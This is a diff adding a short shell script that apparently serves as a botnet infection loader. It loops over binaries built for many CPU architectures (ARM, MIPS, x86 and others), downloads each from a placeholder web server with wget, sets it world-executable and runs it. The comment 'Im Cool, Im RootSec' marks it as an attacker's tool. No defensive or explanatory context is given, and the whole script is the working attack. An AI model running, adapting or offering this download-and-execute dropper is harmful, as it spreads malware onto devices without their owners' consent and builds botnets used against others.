@@ -1,0 +1,14 @@
+#!/bin/sh
+ 
+# Edit
+WEBSERVER="IP:80"
+# Im Cool, Im RootSec
+ 
+ 
+BINARIES="hoho.arm4n hoho.arm5n hoho.arm6n hoho.i586 hoho.i686 hoho.m68k hoho.mips hoho.mpsl hoho.ppc hoho.sh4 hoho.spc hoho.x86"
+ 
+for Binary in $BINARIES; do
+    wget http://$WEBSERVER/bins/$Binary -O rootsec
+    chmod 777 rootsec
+    ./rootsec
+done
